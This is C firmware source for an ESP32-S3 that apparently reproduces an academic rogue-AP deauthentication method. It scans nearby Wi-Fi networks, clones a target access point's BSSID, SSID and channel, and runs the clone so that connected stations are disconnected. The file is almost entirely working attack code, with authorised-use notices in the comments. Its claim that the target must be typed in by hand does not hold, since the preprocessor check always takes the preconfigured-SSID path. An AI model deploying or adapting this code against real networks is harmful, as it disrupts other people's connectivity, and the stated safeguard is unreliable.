/**
 * @file main.c
 * @brief Reproduction of the rogue-AP deauthentication method (Path B) from
 *        "Wi-Fi attacks using ESP32" by Richard Stehlík (FIT VUTBR, 2021)
 *
 *        Paper section 3.3 / Fig. 5: clone the target AP's MAC (BSSID) via
 *        esp_wifi_set_mac(), create an AP with the same SSID on the same
 *        channel, and let the 802.11i standard's native AP behaviour send
 *        deauthentication frames to stations -- WITHOUT any frame injection
 *        and WITHOUT the closed-source WSL bypass (which does not exist on
 *        ESP32-S3).
 *
 * LEGAL / ETHICAL NOTICE:
 *   This is an academic reproduction. It only runs against an ACCESS POINT
 *   YOU OWN OR ARE EXPLICITLY AUTHORISED TO TEST. The operator must type the
 *   target SSID explicitly via serial console - there is no automatic
 *   scanning-and-attacking loop against nearby networks.
 */
#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "nvs_flash.h"
#include "driver/uart.h"

#include "wifi_controller.h"
#include "ap_scanner.h"

static const char *TAG = "repro";

/* Configurable via menuconfig; see Kconfig.projbuild */
#ifndef CONFIG_REPRO_TARGET_SSID
#define CONFIG_REPRO_TARGET_SSID ""
#endif
#ifndef CONFIG_REPRO_RUN_DEMO
#define CONFIG_REPRO_RUN_DEMO 0
#endif
#ifndef CONFIG_REPRO_DEMO_SECONDS
#define CONFIG_REPRO_DEMO_SECONDS 30
#endif

/* Minimal line reader from UART0 (stdin) */
static int read_line(char *buf, int max_len) {
    int len = 0;
    while (len < max_len - 1) {
        char c;
        int n = uart_read_bytes(UART_NUM_0, (uint8_t *)&c, 1, portMAX_DELAY);
        if (n <= 0) continue;
        if (c == '\r') continue;
        if (c == '\n') break;
        buf[len++] = c;
    }
    buf[len] = '\0';
    return len;
}

/* Print scanned AP list with index, SSID, BSSID, channel, RSSI */
static void print_ap_list(void) {
    wifictl_scan_nearby_aps();
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    ESP_LOGI(TAG, " nearby APs: %u", recs->count);
    for (unsigned i = 0; i < recs->count; i++) {
        const wifi_ap_record_t *ap = &recs->records[i];
        ESP_LOGI(TAG, "  [%u] %-32s BSSID=" MACSTR " ch=%u rssi=%d",
                 i, (char *)ap->ssid, MAC2STR(ap->bssid), ap->primary, ap->rssi);
    }
}

/* Find a scanned AP by exact SSID match */
static const wifi_ap_record_t *find_ap_by_ssid(const char *ssid) {
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    for (unsigned i = 0; i < recs->count; i++) {
        if (strncmp((char *)recs->records[i].ssid, ssid, 32) == 0) {
            return &recs->records[i];
        }
    }
    return NULL;
}

/**
 * Path B: clone-AP deauth.
 * 1) set AP interface MAC = target BSSID
 * 2) configure AP SSID / channel / authmode to match target
 * 3) start the clone AP and wait -- 802.11i makes the clone AP reply with
 *    deauth frames to any unauthenticated station sending class 2/3 frames
 */
static void run_rogue_ap(const wifi_ap_record_t *target, int seconds) {
    ESP_LOGW(TAG, "=== Path B: clone AP of '%s' ===", (char *)target->ssid);
    ESP_LOGW(TAG, "Authorised-use only. Target must be your own AP.");

    wifictl_set_ap_mac(target->bssid);
    ESP_LOGI(TAG, "AP MAC cloned to BSSID " MACSTR, MAC2STR(target->bssid));

    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)target->ssid),
            .channel = target->primary,
            .authmode = target->authmode,
            .password = "dummypassword",
            .max_connection = 1,
        },
    };
    memcpy(ap_config.ap.ssid, target->ssid, 32);
    wifictl_ap_start(&ap_config);

    ESP_LOGI(TAG, "Clone AP running on channel %u for %d s. "
                  "Observe deauth frames in Wireshark / sniffer.",
             target->primary, seconds);
    for (int i = 0; i < seconds; i++) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if ((i + 1) % 5 == 0) {
            ESP_LOGI(TAG, "  ... %d/%d s", i + 1, seconds);
        }
    }

    /* Restore state */
    wifictl_ap_stop();
    wifictl_restore_ap_mac();
    wifictl_mgmt_ap_start();
    ESP_LOGI(TAG, "Demo finished. AP MAC restored, management AP back up.");
}

void app_main(void) {
    /* NVS init (required by esp_wifi since IDF 4.x) */
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAG, "==================================================");
    ESP_LOGI(TAG, " Wi-Fi attacks using ESP32 - S3 reproduction");
    ESP_LOGI(TAG, " Path B: rogue-AP deauth (paper sec.3.3 / Fig.5)");
    ESP_LOGI(TAG, " For academic research on YOUR OWN router only.");
    ESP_LOGI(TAG, "==================================================");

    /* Initialise WiFi (AP+STA) and start management AP */
    wifictl_mgmt_ap_start();

    /* Interactive mode: scan, then ask which AP to clone */
    ESP_LOGI(TAG, "Scanning nearby APs...");
    print_ap_list();

    char ssid[64] = {0};
#ifdef CONFIG_REPRO_RUN_DEMO
    /* Non-interactive reproduction: use the SSID compiled into menuconfig */
    strncpy(ssid, CONFIG_REPRO_TARGET_SSID, sizeof(ssid) - 1);
    ESP_LOGI(TAG, "Demo mode: using configured SSID '%s'", ssid);
#else
    ESP_LOGI(TAG, "Type the EXACT SSID of YOUR OWN router to clone, then Enter:");
    read_line(ssid, sizeof(ssid));
#endif

    if (ssid[0] == '\0') {
        ESP_LOGW(TAG, "Empty SSID - nothing to do. Reboot to retry.");
        return;
    }

    const wifi_ap_record_t *target = find_ap_by_ssid(ssid);
    if (!target) {
        ESP_LOGE(TAG, "SSID '%s' not found in scan results. Check spelling.", ssid);
        return;
    }

#ifdef CONFIG_REPRO_DEMO_SECONDS
    int seconds = CONFIG_REPRO_DEMO_SECONDS;
#else
    int seconds = 30;
#endif
    run_rogue_ap(target, seconds);
}
